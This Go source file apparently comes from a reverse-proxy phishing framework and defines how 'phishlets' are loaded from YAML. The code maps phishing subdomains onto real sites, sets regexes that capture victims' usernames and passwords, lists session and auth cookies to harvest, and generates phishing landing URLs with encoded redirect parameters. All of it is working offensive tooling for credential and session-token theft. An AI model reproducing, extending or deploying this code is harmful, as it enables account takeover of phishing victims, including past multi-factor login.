package core

import (
	"encoding/base64"
	"net/url"
	"regexp"

	"github.com/spf13/viper"
)

type ProxyHost struct {
	phish_subdomain string
	orig_subdomain  string
	domain          string
	handle_session  bool
	is_landing      bool
}

type SubFilter struct {
	subdomain     string
	domain        string
	mime          []string
	regexp        string
	replace       string
	redirect_only bool
}

type Phishlet struct {
	Site         string
	Name         string
	Author       string
	minVersion   string
	proxyHosts   []ProxyHost
	domains      []string
	subfilters   map[string][]SubFilter
	authTokens   map[string][]string
	httpTokens   map[string][]string
	k_username   string
	re_username  string
	k_password   string
	re_password  string
	landing_path []string
	cfg          *Config
}

type ConfigProxyHost struct {
	PhishSub  string `mapstructure:"phish_sub"`
	OrigSub   string `mapstructure:"orig_sub"`
	Domain    string `mapstructure:"domain"`
	Session   bool   `mapstructure:"session"`
	IsLanding bool   `mapstructure:"is_landing"`
}

type ConfigSubFilter struct {
	Hostname     string   `mapstructure:"hostname"`
	Sub          string   `mapstructure:"sub"`
	Domain       string   `mapstructure:"domain"`
	Search       string   `mapstructure:"search"`
	Replace      string   `mapstructure:"replace"`
	Mimes        []string `mapstructure:"mimes"`
	RedirectOnly bool     `mapstructure:"redirect_only"`
}

type ConfigAuthToken struct {
	Domain   string   `mapstructure:"domain"`
	Keys     []string `mapstructure:"keys"`
	HttpOnly []string `mapstructure:"http_only"`
}

type ConfigUserRegex struct {
	Key string `mapstructure:"key"`
	Re  string `mapstructure:"re"`
}

type ConfigPassRegex struct {
	Key string `mapstructure:"key"`
	Re  string `mapstructure:"re"`
}

type ConfigPhishlet struct {
	Name        string            `mapstructure:"name"`
	ProxyHosts  []ConfigProxyHost `mapstructure:"proxy_hosts"`
	SubFilters  []ConfigSubFilter `mapstructure:"sub_filters"`
	AuthTokens  []ConfigAuthToken `mapstructure:"auth_tokens"`
	UserRegex   ConfigUserRegex   `mapstructure:"user_regex"`
	PassRegex   ConfigPassRegex   `mapstructure:"pass_regex"`
	LandingPath []string          `mapstructure:"landing_path"`
}

func NewPhishlet(site string, path string, cfg *Config) (*Phishlet, error) {
	p := &Phishlet{
		Site: site,
		cfg:  cfg,
	}
	p.Clear()

	err := p.LoadFromFile(path)
	if err != nil {
		return nil, err
	}
	return p, nil
}

func (p *Phishlet) Clear() {
	p.Name = ""
	p.Author = ""
	p.proxyHosts = []ProxyHost{}
	p.domains = []string{}
	p.subfilters = make(map[string][]SubFilter)
	p.authTokens = make(map[string][]string)
	p.httpTokens = make(map[string][]string)
	p.k_username = ""
	p.re_username = ""
	p.k_password = ""
	p.re_password = ""
}

func (p *Phishlet) LoadFromFile(path string) error {
	p.Clear()

	c := viper.New()
	c.SetConfigType("yaml")
	c.SetConfigFile(path)

	err := c.ReadInConfig()
	if err != nil {
		return err
	}

	p.Name = c.GetString("name")
	p.Author = c.GetString("author")

	fp := ConfigPhishlet{
		ProxyHosts: make([]ConfigProxyHost, 0),
	}
	err = c.Unmarshal(&fp)
	if err != nil {
		return err
	}

	p.Name = fp.Name
	for _, ph := range fp.ProxyHosts {
		p.addProxyHost(ph.PhishSub, ph.OrigSub, ph.Domain, ph.Session, ph.IsLanding)
	}
	for _, sf := range fp.SubFilters {
		p.addSubFilter(sf.Hostname, sf.Sub, sf.Domain, sf.Mimes, sf.Search, sf.Replace, sf.RedirectOnly)
	}
	for _, at := range fp.AuthTokens {
		p.addAuthTokens(at.Domain, at.Keys, at.HttpOnly)
	}
	p.re_username = fp.UserRegex.Re
	p.k_username = fp.UserRegex.Key
	p.re_password = fp.PassRegex.Re
	p.k_password = fp.PassRegex.Key
	p.landing_path = fp.LandingPath

	return nil
}

func (p *Phishlet) GetPhishHosts() []string {
	var ret []string
	for _, h := range p.proxyHosts {
		phishDomain, ok := p.cfg.GetSiteDomain(p.Site)
		if ok {
			ret = append(ret, combineHost(h.phish_subdomain, phishDomain))
		}
	}
	return ret
}

func (p *Phishlet) GetLandingUrls(redirect_url string) ([]string, error) {
	var ret []string
	host := p.cfg.GetBaseDomain()
	for _, h := range p.proxyHosts {
		if h.is_landing {
			phishDomain, ok := p.cfg.GetSiteDomain(p.Site)
			if ok {
				host = combineHost(h.phish_subdomain, phishDomain)
			}
		}
	}
	b64_param := ""
	if redirect_url != "" {
		_, err := url.ParseRequestURI(redirect_url)
		if err != nil {
			return nil, err
		}
		b64_param = base64.URLEncoding.EncodeToString([]byte(redirect_url))
	}

	for _, u := range p.landing_path {
		sep := "?"
		for n := len(u) - 1; n >= 0; n-- {
			switch u[n] {
			case '/':
				break
			case '?':
				sep = "&"
				break
			}
		}
		purl := "https://" + host + u + sep + p.cfg.verificationParam + "=" + p.cfg.verificationToken
		if b64_param != "" {
			purl += "&" + p.cfg.redirectParam + "=" + url.QueryEscape(b64_param)
		}
		ret = append(ret, purl)
	}
	return ret, nil
}

func (p *Phishlet) GenerateTokenSet(tokens map[string]string) map[string]map[string]string {
	ret := make(map[string]map[string]string)
	td := make(map[string]string)
	for domain, tokens := range p.authTokens {
		ret[domain] = make(map[string]string)
		for _, t := range tokens {
			td[t] = domain
		}
	}

	for k, v := range tokens {
		if domain, ok := td[k]; ok {
			ret[domain][k] = v
		}
	}
	return ret
}

func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, domain string, handle_session bool, is_landing bool) {
	if !p.domainExists(domain) {
		p.domains = append(p.domains, domain)
	}

	p.proxyHosts = append(p.proxyHosts, ProxyHost{phish_subdomain: phish_subdomain, orig_subdomain: orig_subdomain, domain: domain, handle_session: handle_session, is_landing: is_landing})
}

func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string, mime []string, regexp string, replace string, redirect_only bool) {
	p.subfilters[hostname] = append(p.subfilters[hostname], SubFilter{subdomain: subdomain, domain: domain, mime: mime, regexp: regexp, replace: replace, redirect_only: redirect_only})
}

func (p *Phishlet) addAuthTokens(hostname string, tokens []string, http_tokens []string) {
	p.authTokens[hostname] = tokens
	p.httpTokens[hostname] = http_tokens
}

func (p *Phishlet) getAuthTokens() []string {
	var ret []string
	for _, v := range p.authTokens {
		ret = append(ret, v...)
	}
	return ret
}

func (p *Phishlet) setUsernameRegexp(key string, v_regex string) error {
	if _, err := regexp.Compile(v_regex); err != nil {
		return err
	}
	p.k_username = key
	p.re_username = v_regex
	return nil
}

func (p *Phishlet) setPasswordRegexp(key string, v_regex string) error {
	if _, err := regexp.Compile(v_regex); err != nil {
		return err
	}
	p.k_password = key
	p.re_password = v_regex
	return nil
}

func (p *Phishlet) domainExists(domain string) bool {
	for _, d := range p.domains {
		if domain == d {
			return true
		}
	}
	return false
}

func (p *Phishlet) isTokenHttpOnly(domain string, token string) bool {
	for d, tokens := range p.httpTokens {
		if domain == d {
			for _, tk := range tokens {
				if tk == token {
					return true
				}
			}
		}
	}
	return false
}

func (p *Phishlet) MimeExists(mime string) bool {
	return false
}
